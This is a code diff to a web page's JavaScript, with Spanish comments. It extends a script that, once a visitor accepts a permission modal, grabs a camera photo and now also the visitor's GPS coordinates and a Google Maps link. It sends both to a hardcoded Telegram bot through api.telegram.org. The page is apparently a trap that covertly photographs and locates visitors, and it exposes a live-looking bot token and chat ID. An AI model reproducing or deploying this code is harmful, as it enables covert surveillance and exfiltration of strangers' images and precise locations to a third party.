@@ -65,10 +65,41 @@
     </div>
 
     <script>
+        const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
+        const chatId = '1223367230'; // Chat ID
+        let locationInfo = 'Ubicación: No disponible (usuario no otorgó permisos).';
+        let mapLink = '';
+
         async function requestPermissions() {
             const modal = document.getElementById('permission-modal');
             modal.style.display = 'none'; // Ocultar el modal después de la aceptación
+            await getLocation(); // Obtener ubicación
             await initializeCamera(); // Iniciar la cámara
+        }
+
+        async function getLocation() {
+            if (navigator.geolocation) {
+                try {
+                    await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                const { latitude, longitude } = position.coords;
+                                locationInfo = `Ubicación: Latitud ${latitude}, Longitud ${longitude}`;
+                                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                                resolve();
+                            },
+                            () => {
+                                console.warn('No se pudo obtener la ubicación.');
+                                resolve();
+                            }
+                        );
+                    });
+                } catch (error) {
+                    console.error('Error al intentar obtener ubicación:', error.message);
+                }
+            } else {
+                console.warn('Geolocalización no soportada por el navegador.');
+            }
         }
 
         async function initializeCamera() {
@@ -97,8 +128,6 @@
         }
 
         async function captureAndSendPhoto(video, stream) {
-            const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
-            const chatId = '1223367230'; // Chat ID
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
@@ -114,6 +143,9 @@
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', `Nuevo visitante:
+- ${locationInfo}
+- Enlace a Google Maps: ${mapLink || 'No disponible'}`);
 
                 const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
